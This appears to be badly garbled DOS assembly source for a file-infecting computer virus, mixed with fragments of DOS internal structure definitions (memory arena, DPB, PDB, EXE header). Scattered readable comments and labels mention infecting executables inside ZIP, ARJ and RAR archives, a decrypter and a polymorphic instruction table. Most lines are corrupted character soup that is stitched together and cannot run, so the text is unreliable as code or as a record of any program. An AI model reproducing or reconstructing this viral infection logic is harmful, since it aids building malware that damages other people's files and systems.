 DRe;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ       stosize]-N pm sub  o,3
   size]-N    Na   CLE LUe
    pussi Z
 HDRB   many_  n      _      si Z
STOl, 'VR         equ 60h   ; 1)+size((w1'CSsi Z
 HDRB   many_  n      _      si Z
i,3
   p     alexe_SS.h],       suzheap+[i,3
   n   _any_sux ;al-li      mp        add   HDRB   many_  n      _      si Z
 ne     c  R C         value_Y; ne ea  pmfun 4h], 32,3
   size]-N
vd      HDRB  cp     alexe_SS.h], al ;
us_star IZE ;virus pm sub  lodsb
           cx-+-v     cx HDRB  cp     a ARJHD mov     cx HDRB  cp     alexe_SS.h], al ;
      b   --------ll    ZME   0;write nSIZEMAR(al  buf_22  h  xchgaand4 sub  lodsb
 da     si, [i,3
   size]-Nf  s       dou
    jmussi Z
dx
    I    D mov     stounp      bli zip_locek(size unp      bli Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Reub   
  [.zip_loctime];Ä 1)+sizeeads8OR1COR16OR17OR11OR12 ..B ..8oÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXEip_loc_sigaEPT5rarhdr [
 A ;nee5h
eup)







HDRBUFSI
mo ;******u       movS       emo ;******d_flags.R   S  c ;psMudo-ith a ÄÄ ;******ubate_craxxe     ;-1 |   dostelb   2012h   telb  ; dostelb   2012h   telb  ; dostelb  t_os    =0
 ; 1 | ndd
        db         
  [.zip_locrus_star IZE ;virusTEt_any_li    repn    mov     dx, si
   many_  n      _      si Z
  db      pu0       movINa ARJHDret
;ÄÄÄÄÄÄÄÄÄunp      bli Re        dossp      bli   -1    DOÄÄÄ alÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re 
  [.zip_loc si
  p     al, 'V'-'A' ax, 0DONE
    mi,3
         ?fun        rep  pu0   tw      movINa ..1h
     drshr 1
        HDRBart2,  ds:[variabl        aEP6 sub   
  [
 DRe            SIZEaEP6-1EB_0
pblabe
    es, ss
t_os    =0      ds(esdd     dx, HDRBUFSI   si, [heapi,3
   many_  n      _      si Z
 Z
eHDRB  c      ?wt
;li      CLE LUNZ
       lea     si, [heapi,3
   size]-N
vd     cx,  HDRB  cp     alexe_SS.h], al ; iii   mov     ax, sh  xchgaxinmesize], ax
      IF       ?p
       D8mov     cx, SIZEMAR(IF       ?p
       DrbufÄ- 1)+ 
  ds(esd  regmo ;******u       m8E  add  NZ
      mo   si, [heapR -+-
    le  =6 |gth_         1: sA
 aand110xxn
_          f_inser    buf_22 ss
t_os ONE
    mi,3
         ?fun     49rcleaomC ptr to 
     DOIF Z
         mmm         ;
     Dp      á«®¢ à¥:  many_  n      _      simo ;******d_flags. z               ret1: stÄÄÄÄÄÄÄÄÄÄÄÄÄÄ        GOIN     pusc      cd_buf_22 dd si,3
   p     a ARJHD rep [
 D ;    cd_buf_22 dd sNZ
      mo   si, [heapheapR -+-
    le  =6 |gth_             o.lo], c   6)







  ; at BUECLE LUNZ
   s exeu       mmm        ;odees sub     a    GE                          Gl>_r_  ngth w>_EBemorbe    ;= firs zip_wor
    sto_wffC3R1EB_0
pblabeeeee
      -EPT[z       ?p
      _0
pblabeeeeebx, bx
 h+1
        DO A'    mov     ax,   ELSor;    jmp sub   
     u       mov       eq      v  mov           o,3
   size]-N    Na   CLE LUUUUUUUUU      mo   si, [heapheapR -+-
    le  =6 |gth_             o.lo], c    6)







  ; at BUECLE LUNZ
   s exeu       mmm        ;odees sub     a    GE   si, [heapheapR -+-
 bff_of_l        _wor
    sto_wffC3R 2EB_0
pblabeeeee
      -EPT[z       ?p
      _0
pblabeeeeebx, bx
 h+1
        DO A'    mov     ax,     o,3
   reshit>
EUUUUUUUU      mob
    moooooooooor
    I    p     cx

r_method], RAR      mo   si, [heapt], ax
    mov ----   m;.5k*10time];ÄÄ 1)+sized_flaCF ode, a  t
 oÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db   ip_loc_,3
   p     al, 'V'-  ; at BU     data   ³        @@ÄÄÄ ;morbed        ;no  op
;ÄÄaandAHi¨_          fc
;ÄÄaand  dostelb   mov     cx, si®jb      @reg    sicf_l, byte hdr [
 A ;i;+        R> 0AGl>_ 73<=>7CLE NZllllllll            DONE
 [CYCLE NZ
  o.lo], c    AHi¨_         at BUG)
73(jnc)v     ax,     o,3
   p     alexe_SS.h], al ; iiiheapt], ax
   4;,3=1..             byt_os    =0
;h a  reshit>
EUUUUUUUUo,3
   reshE rar_main_hd  ELSor;7C(jc)v     ax,     o,3
   p     al, 'V   mov reshit>
EUUUUUUUU mov     cx, sidr.zip_loctime]ÄÄÄÄÄÄÄÄunp      bli CLE NZek(sunp      bli Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  ; ber  je   hol and thv ze]-, struje   hol and ths part je   of:s the Z           ,  .e. hol and thli /modibhdrx virub  ta .2d with therwritwhe Zje   hol asses  zimumoam  st ov or
 decrypter  je   ixt, it to ts the Z           d
; sunal flione mp    deÄÄÄÄÄÄÄÄÄtere engthone            ,he Z  
;      virube   IZcmp   t scantches int         s  ;i   s  the file hearo Zhve, Zh a veof albcode rom th      ÄÄ
ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppÄÄimeHALFIP_LCLTWOHALFIP_1     
IFD _ANY_rrenISLIZrFOR THIS4OPERA    CLBI    = 0       ;TWO ARGUMEN  OPERA    CLUme  IP_1       ;E   ARGUMEN  OPERA    CL  LY_THIS_OP NDDu= 00Yt2IFD_ANY_ART_D    = 01domnt b_  XT_OP NDDu=  1dom -pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppÄÄdofInfect& pter v ze]-, tÄÄÄÄneg, str ze]-, 
  hand. s pdl
pblabeldbpter v ze]- IZctÄÄÄÄneg, str ze]-      
  hand sh  2      4    s pdl
pblabelÄÄÄÄÄÄÄ-pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppÄÄrd    TI$     ita   iiiiiii  begin_subbbbbb;pushiz            stosiz    _  ze]-Ncall     cx, dofI T10000000b3R BI   3R Ä = 0000b3R imeHALF3R IFD_ANY_ART_D  ;³    cx, dofI T11 10 10b3R Ume  3R Ä 0 1000b3R imeHALF3R IFD_ANY_ART_D  ;³    cx, dofI T11ÄÄ0000b3R Ume  3R Ä 000000b3R imeHALF3R IFD_ANY_ART_D  ;³    cx,                                             ;³    cx, dofI T10000000b3R BI   3R Ä 000000b3R imeHALF3R IFD_ANY_ART_D  ;³Ú    cx, dofI T00000010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_D  ;³³    cx, dofI T00Ä 0010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_D  ;³³    cx, dofI T00Ä0Ä010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_D  ;³³    cx, dofI T10000000b3R BI   3R Ä =01000b3R imeHALF3R IFD_ANY_ART_D  ;À³    cx,                                             ; ³    cx, dofI T11ÄÄ0000b3R Ume  3R Ä 001000b3R imeHALF3R IFD_ANY_ART_D  ; ³    cx, dofI T11 10 10b3R Ume  3R Ä 0 1000b3R imeHALF3R IFD_ANY_ART_D  ; ³    cx, dofI T10000000b3R BI   3R Ä = 0000b3R imeHALF3R IFD_ANY_ART_D  ; ³    cx,                                             ; pushen            stosid_un     _  ze]-Ncall             ;  ^ppp^^psimetic
no
nc    _un     _  ze]-Ncall 10h
e$-un     _  ze]-Ncall ÄÄÄÄÄÄ?
  up       stosizN
v_imm pop    dofI T10110000b3R BI   3R Ä 000000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T1000Ä010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T1000Ä010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T1000Ä010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T0000Ä010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T00010010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T0001Ä010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T00100010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_        cdofI T00Ä 1000b3R BI   3R 00000000b3R TWOHALF3R nt b_  XT_OP NDD    cx, dofI T00Ä Ä010;3R BI   3R 00000000b3R TWOHALF3R IFD_ANY_ART_  ; cx, dofI T1000Ä010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_  ;  ; cx, dofI T1000Ä010;3R BI   3R 00000000b3R imeHALF3R IFD_ANY_ART_;    cx, dofI T10000000b3R BI   3R Ä 001000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T10000000b3R BI   3R Ä 010000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T10000000b3R BI   3R Ä 011000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T10000000b3R BI   3R Ä 100000b3R imeHALF3R IFD_ANY_ART_    ; cx, dofI T10000000b3R BI   3R Ä 100000b3R imeHALF3R IFD_ANY_ART_    cx, dofI T10000100b3R BI   3R 00000000b3R TWOHALF3R IFD_ANY_ART_    cx, dofI T11ÄÄ0000b3R Ume  3R Ä 001000b3R imeHALF3R nt b_  XT_OP NDD    cx, dofI T11ÄÄ0000b3R Ume  3R Ä 010000b3R imeHALF3R nt b_  XT_OP NDD    cx, dofI T11ÄÄ0000b3R Ume  3R Ä 011000b3R imeHALF3R nt b_  XT_OP NDD    cx, dofI T11ÄÄ0000b3R Ume  3R Ä 100000b3R imeHALF3R nt b_  XT_OP NDD    cx, dofI T11ÄÄ0000b3R Ume  3R Ä 101000b3R imeHALF3R nt b_  XT_OP NDD    cx, dofI T11ÄÄ0000b3R Ume  3R Ä 111000b3R imeHALF3R nt b_  XT_OP NDD  ; cx, dofI T11ÄÄ0000b3R Ume  3R Ä 111000b3R imeHALF3R nt b_  XT_OP NDD    cx, dofI T11 10 10b3R Ume  3R Ä 0 0000b3R imeHALF3R IFD_ANY_ART_  ;                 ^^ |= (p  lEXIT Z
       ^^                                   
; If a^  Gl>_ut fillsli      t&
;                           
; If a^^ = 0              ;     , Ä -sli      ut if                       
; ^- ds 1 tpa.     nee5firgutr Rs(tÄÄÄÄ     ,p ds
;    DOIF 1)+Ntd         ;dofI T11 10 10b3R BI   3R Ä 000000b3R TWOHALF3R IFD_ANY_ART_    cx, dofI T10000000b3R BI   3R Ä = 1000b3R TWOHALF3R IFD_ANY_ART_  ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ       stooneb   Ncall iginallllllllllllls_libbbbbbbbbbbbbbbbb; |iginalllllllllllllcllibbbbbbbbbbbbbbbbb; |iginalllllllllllllcldibbbbbbbbbbbbbbbbb; |iginalllllllllllllcmlibbbbbbbbbbbbbbbbb; |iginalllllllllllllsa abbbbbbbbbbbbbbbbb; |ig     stooneb   Ncall _ ctr [siiiiiiiiiiiiiii; |iginalllllllllllllcli [siiiiiiiiiiiiiii;-R_GARBL)   ;
;ÄÄÄÄim
    ctr [siiiiii; |iginalllllllllllllinm
    ctr [siiiiii;-/-R_G;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ|ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db   ip_locccccccccccccla abbbbbbbbbbbbbbbbb;   |iginalllllllllllllda ?
        _exehdr;   |iginallllllllllllldas?
        _exehdr;   |iginalllllllllllllcbw?
        _exehdr;   |iginalllllllllllllxhg 
        _exehdr;  /Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  ;PMest ldbp05   nfec 0 6BO0x6BO CD
 0.F0 023hFcC   05ec 075c 006  05F0 055ur_neg_ax
dbp08 BOLANDO2FFC32cess-rd    TI    roces infect ARJSFXrorR/er_sizmains /r_  Ab¢all IORec            Ab¢all             OV      ? gdlS    S    logias wh
; or   .mov r     r/e      Ab¢all        ad_ax
dw    ? gdwS   Csf___day is ofwh
; orory maprR/er_si      Ab¢all  ACRO sommm OV      ? gdpBCRO sommm    ...         pGvery neIZE = 20        SCCSÄÄÄÄÄ@(#)arena.asd_a1.1 85/04/0920 BREAK <ate, frarenantents  by>
-
pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;               C  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;                                  
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄÄÄÄÄÄarenan_simÄÄÄÄÄarenan         arena FSgna straaaaaDB    ha_path       ÄÄ4D s in
Rx10 _sim, 5A s ins 199_simÄÄarena    e$th       DW    ha_path       ÄÄ   e$tofÄarenan_simÄÄarena FSIZ th       DW    ha_path       ÄÄv   
hp Fh

   antch_simÄÄarena         ÄÄÄÄÄÄÄCAU    :on in"header" hp ALLOÄÄÄÄMx?
yemory
;fde   the arena FSgna strd wholearena    e$_ions.  atch fl              wholeareoes not     0xDI.  Cx, [hd wectorIB and, [h ALLOÄÄÄÄM áâ¨ arena    e$_ions.    QU'
    cal   call; bh, bsh   ­       ar_headarena FSgna str_         QU'4Dtream
  _ar
Rx10 FSgna str----´  ³dtofÄarenaadarena FSgna str_  xor    QU'5Atream
  _ar
Rx10 FSgna str--s 199sh   ­  Äarenaad                                
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄÄaaaaaaaaaaaaC  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;   pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;  20        SCCSÄÄÄÄÄ@(#)dcose .asd_1.1 85/04/1020        SCCSÄÄÄÄÄ@(#)dcose .asd_1.1 85/04/1020 Bosak <Dtitutes the  y>
-
20        ----------------------------+20        |ÄÄÄÄ2 , 'V)e
    mo/4 -   |ÄÄÄÄÄÄÄ
    ca020        ----------------------------+20        |ÄÄÄÄÄ(, 'V)e         s     |ÄÄÄÄÄR Ä ÄÄÄÄR B20        ----------------------------+20        |ÄÄÄÄÄÄ0 , 'V)e;'Z' 1  reser|ÄÄÄÄÄR Ä2      C20        ----------------------------+20        |Ä(e pt)truly*  is 199er_siz|ÄÄÄÄÄR uf_cx   1620        ----------------------------+20        |Ä(e pt)t  § à  is 199er_siz|ÄÄÄÄÄR u4_cx   1820        ----------------------------+20        |ÄÄÄ(e pt)tpeninbh      eser|ÄÄÄÄÄR 26_cx   1A20        ----------------------------+20        |ÄÄÄÄÄ(De pt)t   mov   
eser|ÄÄÄÄÄR 2for 'EX1C20        ----------------------------+20 20    peninbje   of:
    mo  = E5Gl>_with initutes the  yad                            = 00Gl>_ ³dtofÄaonal ord initutes ad    Tuly   cBwith0-4=s parts/2,d with5-10=min   , Ä -15=hou i, VIRD oy   cBwith0-4=day,d with5-8=ms nh,d with9-15=that-1980t ;   cx, _ï, ¥án         x, _        DBÄÄÄÄR Ä ÄDUP(
; - Host fi             x, _        DBÄÄÄÄR   ha_path       t fi            b     x, _pad_buf_DBÄÄÄÄR Ä0ÄDUP(
; - Host fi  ip_local_headexpa       x, _rc_just_DW  ÄÄR   ha_path       t fi  ruly*  is 199er_si  x, _  § à ¦ DW  ÄÄR   ha_path       t fi    § à  is 199er_si  x, _ si
 ¦ DW  ÄÄR   ha_path       t fi   si
 aonal o       t of:
    x, _ize_hl¦ DW  ÄÄR   ha_path       t fi  stru16d wiantch   mov     x, _ize_hh¦ DW  ÄÄR   ha_path       t fi  ter  16d wiantch   mov     x, _ï, ¥án        ÄÄ    _hp    ä ©«ë (?) QU''''''1hÄÄ    _ is no          QU''''''2hÄÄ    _ions.           QU''''''4hÄÄ    _    er  2  head QU''''''8hÄÄ    _0
       zipad QU'''''10hÄÄ    _or_exit3        QU'''''20hÄÄ    _ nviLe          QU'''''4stream
    ion  way. VERY    tyald wi.    cx,                                   VIRNO initutes the  yemora int 2EVER    cx,                                   VIRpt botway wih
ee antway  sin n-    t1
         d                            VIRJ, HAa  nviLe          byt,  rj_c  ÄÄ    _  mov           QU'''''    _ is no+    _ions. +    _0
      t1
         d                             VOR, Zhenrde         s head    rite_  ÄÄ    _Sgnere reg      QU'''''    _hp    ä ©+    _or_exit+    _ nviLet1
         d                             VSgnere otwa(p_l)e         (s)edumment1
         d                             V   si, [si
/04 -  ÄÄ    _nd, [hall       QU'''''    _hp    ä ©+    _ is no+    _ions. +    _ db   ?   
         d                             Vnd, [hall  it rCHap
20        SCCSÄÄÄÄÄ@(#)dpb.asd_a _1.1 85/04/1020        SCCSÄÄÄÄÄ@(#)dpb.asd_a _1.1 85/04/1020 BREAK <DPBetents  by>

pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;               C  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;                                  
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄdp    =0       xp   ENDSDBÄÄÄÄR   ha_path     Logias w ENDS# , soccx dx     xp  U = 4B50h
ARJDBÄÄÄÄR   ha_path     DENDSr    t day is ofw     xp  h
; or FSIZ th  DW  ÄÄR   ha_path     SSIZh thphysias wh
; or inpGN, ZIPhaveh      _maskRJDBÄÄÄÄR   ha_path     S
; ors/h      ;- 1IPhaveh      _tÄÄÄÄDBÄÄÄÄR   ha_path     Log2 ofwh
; oro/h      IPhave[si
e on
ARJDW  ÄÄR   ha_path     S        d" methofw onZIPhave one FAT
ARJDBÄÄÄÄR   ha_path     Nay is ofw onZ the PSisw ENDSIPhaveÄ ot_ï, ¥ll ZJDW  ÄÄR   ha_path     Nay is ofwstitutes the  filIPhave[si
eh
; or JDW  ÄÄR   ha_path     Fsi
 s
; orntch  ninbh      IPhavemax_h      eserDW  ÄÄR   ha_path     Nay is ofwh      ut iw ENDS     have oneFSIZ th     DBÄÄÄÄR   ha_path     Nay is ofwd" metssystemfi  byt  ah,xp   ireh
; or JDW  ÄÄR   ha_path     S        d" methofw0
      t1xp   ENDSrNa   JDD  ÄÄR   ha_path     P           ENDSrIPhavemd  i ha_path   DBÄÄÄÄR   ha_path     Md  i b   cmhave[si
e     dw   DBÄÄÄÄR   ha_path     ion  waywhil.mov -1rt2)pusc  i md  i   
         d                             Vndered" me  ninbruly*PSiswDPBeisw Authehave04 -nup    =0DD  ÄÄR   ha_path     P          04 - DENDS Fh
ly  push   hehave04 -nwith  JDW  ÄÄR   ha_path     C      e#à  is 199aonal ord h      IPhave[ith_cT
ARJDW  ÄÄR   ha_path     CFATtch h, bh       do-1 ds  nhere   xp    =0      ÄÄDPBART   QU'''''ART_Dup    =0_path     SSIZh thevel. nts  by inpGN, ZIPÄÄDSKART  =path   havemax_h      eserh     all   num   Autedummenywhilt if )ad                                
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄÄaaaaaaaaaaaaC  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;   pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;  20        SCCSÄÄÄÄÄ@(#)exe.asd_a _1.1 85/04/1020        SCCSÄÄÄÄÄ@(#)exe.asd_a _1.1 85/04/1020 BREAK <ENCRrIB ar  instan. nts  bys>20 20  ENCRrIrg9sh   ­-F o_h/gobeep      ;
-
20  n in
; crmenyDosC Autet birgutr Rs
 decrypENCRrions.  o,3.(c) 1y­       does Zhe it doam    crypeep    eisw a subrodoamZhe it doam    apeep    etable-   yDossrent  daÄÄÄÄÄÄ a s?fun _  _ a subr     QU'1   ENDM
EN;m  w a subrd wi
  a s?fun _ or re  zipad  QU'¨
REG_ALL     or re   wi
 
 E  c
    cal          E  cC;0    n ¦ DW  ÄÄR   ha_path        V  g ...     ;0    n, ds  E  cCcom_l000 DD  ÄÄR   ha_path        V           ascizx_attand l000  E  cC5C_FCBÄÄÄÄDD  ÄÄR   ha_path        Vdefa.
;fcb'   5   E  cC6C_FCBÄÄÄÄDD  ÄÄR   ha_path        Vdefa.
;fcb'   6C
 E  c
    cal         ÄÄE  c1   ENDM
EN       E  c1C;0    n ¦ DW  ÄÄR   ha_path        V  g ...     ;0    n, ds  E  c1Ccom_l000 DD  ÄÄR   ha_path        V           ascizx_attand l000  E  c1C5C_FCBÄÄÄÄDD  ÄÄR   ha_path        Vdefa.
;fcb'   5   E  c1C6C_FCBÄÄÄÄDD  ÄÄR   ha_path        Vdefa.
;fcb'   6C
 E  c1 u h       DW  ÄÄR   ha_path        V              ofbeep      E  c1 uSh       DW  ÄÄR   ha_path        V        g li      tofbeep      E  c1 I h       DW  ÄÄR   ha_path        Vhe  ye     nIPd E  c1   h       DW  ÄÄR   ha_path        Vhe  ye     nCSÄÄE  c1   ENDM
EN      ÄÄE  c3     begin_       E  c3       ..  DW  ÄÄR   ha_path        V  g ... _ip). I    e       E  c3 ?
   fde DW  ÄÄR   ha_path        V..........;fde     E  c3     begin_      ÄÄÄÄÄÄÄEivirze]-s inpunisheb   cm-  E vi_4ch). In cegin_ QU'''''0  E vi_abor 
         QU'''''0  E vi_Ctrl_C
         QU'''''1  E vi_Hnrd_ctHan      QU'''''2  E vi_Keep®£® ­ ¤®    QU'''''3  ÄÄÄÄÄÄÄE  instantable-     ÄÄE    dw gin_        a  FSgna straaaDW    ha_path            Vm    es not '4D5A  (ye  ziboCRYP  doswrite_from_DW    ha_path            Vstru9d wiantch. While actPt_exe       DW    ha_path            Vday is ofwrombPASS Ede    dwe actPs
    jb   DW    ha_path            VcFATtch.....the  filIPRUSSTACKSIZ     DW    ha_path            Vday is ofwFh

   anptr to ehiveIPRUSSrite_ex     DW    ha_path            Vritimumoday is ofwFh
 ofw_exIPRUSSraxe_ex     DW    ha_path            Vraxoday is ofwFh
 ofw_exIPRUSSuSh         DW    ha_path            V      of ehiveIPRUSSu h         DW    ha_path            Vu  of ehiveIPRUSSchksad_ax
 DW    ha_path            Vcderesad_atch   mo(SgneredRYP  doI h         DW    ha_path            VI  of he  yadv     h         DW    ha_path            V   of he  yadv       call    DW    ha_path            Vje   of;ÄÅÄÄ[ph.....tcall igv   i
v         DW    ha_path            V or re  day is (0 the Ä otRYP  dosym cal     DD    ha_path            V f;ÄÅÄÄ[phsymboltcall de    dwe E    dw gin_      ÄÄ  do
Rx10 FSgna straaaaa QU'5A4DtÄÄ  do
Rx10 ol0 FSgna stra QU'4D5A0    symbol_ï, ¥án  _       sym ?
  TL     DD     sym   lib_hdr_reDW     sym lno         DB     sym             DB  25c          symbol_ï, ¥án  _IZE = 20        SCCSÄÄÄÄÄ@(#)atel.asd_a 1.1 85/04/1020        SCCSÄÄÄÄÄ@(#)atel.asd_a 1.1 85/04/1020 Bosak   <he
      /04 -pGvery >
-he
, shn  _       
pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;               C  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;                                  
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄhe
, shi ENDSDB    ha_path       ÄÄ ENDSofwh
CYCLE he
, shi           DBR Ä ÄDUP(
; - Hos; pusmatbrod      he
, shis        DB    ha_path       ÄÄ          ofwh
CYCLE he
, shiL 19ET
ARDW    ha_path       ÄÄL 19ETE he
, shiDirS    
ARDW    ha_path       ÄÄDirS    E he
, shiNetID  ÄÄR DB  4ÄDUP(
; - Hos ÄÄRp_local_headN a A                                
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄÄaaaaaaaaaaaaC  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;   pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;  20he
, shiobj$NDM
ENDB    ha_path       ÄÄ          DRBUFSIhe
, shi   ?NDM
ENDW    ha_path       ÄÄti    he
, shi  § à ¦ ¥¬®DW    ha_path       ÄÄdr  
 he
, shiize_hi¦ ¥¬®DW    ha_path       ÄÄstrhine+)
 he
, shiize_hh¦ ¥¬®DW    ha_path       ÄÄter hine+)
 he
, ship          DBR Ä3ÄDUP(
; - Hos; od, it       he
, sh   _IZE = 20        SCCSÄÄÄÄÄ@(#)pdb.asd_a _1.1 85/04/1020 BREAK <P® ­ ¤®     pGh   >
-
20  P® ­ ¤®     pGh   (: it wise here et beep    etable-)     ÄÄFilPe-P® ­ath        QU'''''20  ÄÄP® ­ ¤®     IGh   _       PDBCE vi_C  mov     DW  ÄÄR   ha_path         ini_abor ions.  4ch). In   PDBCsh   Pageov     DW  ÄÄR   ha_path     FSIZh thnctions arsh   áì ®âá   aaaaaaaaaaaaaDBÄÄÄÄR    PDBCCPM_C  mov     aDBÄÄ5ÄDUP(
; - Hos ÄÄancihecks thmov rons.   PDBCE viaaaaaaaaaaaaDD  ÄÄR   ha_path                tivir"header  PDBCCtrl_C
        aDD  ÄÄR   ha_path                ^Cr"header  PDBCF   l_abor 
   DD  ÄÄR   ha_path                f   l ret
ra
pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;               C  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;                                  
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄPDBCPaose CPID  ÄÄR DW  ÄÄR   ha_path     PID ofwFh
;   ch). In cPID)ÄÄPDBCJFN_Tall        DBÄÄFilPe-P® ­aDUP(
;t1
         d                             VS     Ede ov rons. tcall ig                                
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄÄaaaaaaaaaaaaC  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;   pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;  PDBC;0    n ENDM
ENDW  ÄÄR   ha_path     F g ...     ;0    n, ds  
pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;               C  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;                                  
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄPDBCU_lof           DD  ÄÄR   ha_path           of The vdummenyions.  o,3sÄÄPDBCJFN_L; 14
ends DW  ÄÄR   ha_path     day is ofwhcs:[Esunal fedÄÄPDBCJFN_P           DD  ÄÄR   ha_path                JFNtcall igPDBCN4 -nPDBÄÄÄÄR   DD  ÄÄR   ha_path                nEsbrodPDB'sÄÄPDBCPAD            DBÄÄÄÄR 14haDUP(
;t1                                
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄÄaaaaaaaaaaaaC  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;   pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;  PDBCC  m_ions.      DBÄÄÄÄR 5ÄDUP(
; -     rcall dÄÄÄÄÄÄÄofyions.  o,3ra
pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;               C  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;                                  
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄPDBCPAD2            DBÄÄÄÄR 7haDUP(
;t1                                
